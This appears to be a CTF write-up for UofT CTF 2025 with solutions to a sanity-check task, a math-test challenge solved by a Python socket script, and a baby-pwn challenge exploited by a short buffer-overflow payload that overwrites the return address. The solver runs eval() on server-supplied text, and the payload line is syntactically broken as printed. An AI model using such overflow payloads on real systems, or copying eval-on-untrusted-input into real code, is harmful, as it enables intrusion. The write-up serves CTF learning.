# UofT CTF 2025

## ✨ Misc
### Sanity check
**Description**
> Welcome to UofTCTF 2025!
> Looking for the flag? Make sure you join the [Discord server](https://discord.gg/Un7avdkq7Z). The flag format is uoftctf{...}.

**Solve**

This is just sanity check chall, so just input the flag that was given on discord.

**Flag :**
```
uoftctf{welcome_to_uoftctf_2025!!!!!}
```

### Math test
**Description**
> Complete this simple math test to get the flag.
> `nc 34.66.235.106 5000`
> Author: White

---[Attachment file](chall.py)---

**Solve**

In this challenge, i have to solve all math questions from the server. When i check into the source code, it's endless 1000 questions with crazy numbers range💀💀. "I can't doing ts for rest of competition". So, i decided to make a solver script in python. In that script, it solve any questions from the server correctly. Just connect it with socket, and damnnn. you got the flag.

![image](https://github.com/user-attachments/assets/ef590c05-3f04-4b13-8b0b-948c589236f2)



Here is my code to solve this 1000 math questions
```python
import socket
import re

def solve_math_problem(problem):
    try:
        return eval(problem)
    except ZeroDivisionError:
        return None


def main():
    host = "34.66.235.106"
    port = 5000

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))

        while True:
            data = s.recv(1024).decode()
            if not data:
                break
            
            print(data)

            match = re.search(r'Question: ([-+*//\d\s]+)', data)
            if match:
                problem = match.group(1).strip()
                print(f"Solving: {problem}")
                
                answer = solve_math_problem(problem)
                if answer is not None:
                    s.sendall(f"{int(answer)}\n".encode())
                else:
                    print("Zero division error occurred.")
                    break

            # Print the flag 
            if "Congratz!" in data:
                print(data)
                break

if __name__ == "__main__":
    main()

```
**Flag :**
```
uoftctf{7h15_15_b451c_10_7357_d16u153d_45_4_m47h_7357}
```
<!--
# Web
## Scavenger Hunt
**Description**
> 
**Solve**


So, if we arrange all of the parts, we got the flag.
### Flag :
```
uoftctf{ju57_k33p_c4lm_4nd_1n5p3c7_411_7h3_4pp5_50urc3_c0d3!!}
```
-->

## 💻 Pwn
### baby-pwn
**Description**
> Here's a baby pwn challenge for you to try out. Can you get the flag?
`nc 34.162.142.123 5000`
Author: atom

**Solve**

As we see at first, this challenge provide the source code and compiled one. We can buffer overflow this chall by passing some 64 + 8 bit input
```bash
python3 -c 'print("A" * 64 + "B" * 8 + \x66\x11\x40\x00\x00\x00\x00\x00)' | ./chal
```
You can change the "**./chal**" with netcat or the original program. Once we run the payload, we'll get this flag

![image](https://github.com/user-attachments/assets/46335ee5-b84d-47c3-9901-58577c94aa72)


**Flag :**
```
uoftctf{buff3r_0v3rfl0w5_4r3_51mp13_1f_y0u_kn0w_h0w_t0_d0_1t}
```









==============================================================


Thanks for read this writeup. If u wanna support me, buy me a coffee [here](https://ko-fi.com/abiabdillah) or click button below

<!--<a href="https://ko-fi.com/abiabdillah" style="text-align: center;"><img align="center" width="150" alt="support_me_on_kofi_blue" src="https://github.com/user-attachments/assets/c0fa4650-315c-4a4a-b1e3-76131e9eb8b8" /></a>
-->

[![PayPal](https://img.shields.io/badge/PayPal-00457C?style=for-the-badge&logo=paypal&logoColor=white)](https://paypal.me/abiabdillah) [![Ko-Fi](https://img.shields.io/badge/Ko--fi-F16061?style=for-the-badge&logo=ko-fi&logoColor=white)](https://ko-fi.com/abiabdillahx)
<!-- [!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.ko-fi.com/abiabdillah) -->
